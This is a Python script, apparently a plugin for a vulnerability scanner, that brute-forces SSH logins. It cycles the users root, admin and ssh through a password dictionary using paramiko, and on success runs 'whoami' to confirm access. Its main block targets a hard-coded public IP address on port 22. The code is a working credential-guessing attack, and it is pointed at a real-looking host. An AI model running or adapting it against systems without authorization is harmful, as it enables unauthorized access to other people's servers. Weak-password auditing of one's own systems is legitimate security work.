# coding:utf-8

import paramiko
from exp.lib.gla import getpassdict

paramiko.util.logging.getLogger('paramiko.transport').addHandler(paramiko.util.logging.NullHandler())


def verify(protocol,ip,port):
    url = ip+':'+str(port)
    print('testing if ssh weak pass vul')
    user_list = ['root','admin','ssh']
    passdictarr = getpassdict()
    psw = passdictarr.get_pass_dict()
    psw.append('ssh')
    ssh = paramiko.SSHClient()
    ssh.set_missing_host_key_policy(paramiko.AutoAddPolicy())
    for user in user_list:
        for pass_ in psw:
            try:
                pass_ = str(pass_.replace('{user}', user))
                print("cracking ssh password with:  " + user + " and pass : " + pass_)
                ssh.connect(ip, port, user, pass_, timeout=5, allow_agent = False, look_for_keys = False)
                ssh.exec_command('whoami',timeout=5)
                if pass_ == '':
                    pass_ = "null"
                msg = 'There is ssh weak pass vul on: %s , with username: %s and password: %s.' %(url,user,pass_)
                print(msg)
                number = 'v65'
                ssh.close()
                return True,url,number,msg
            except Exception as e:
                pass
            finally:
                ssh.close()
    msg = 'Therer is no ssh weakpass vul in url:' +url+'.'
    number = 'v0'
    return False,url,number,msg

if __name__ == '__main__':
    res = verify('http','183.237.147.108',22)
    print(res)



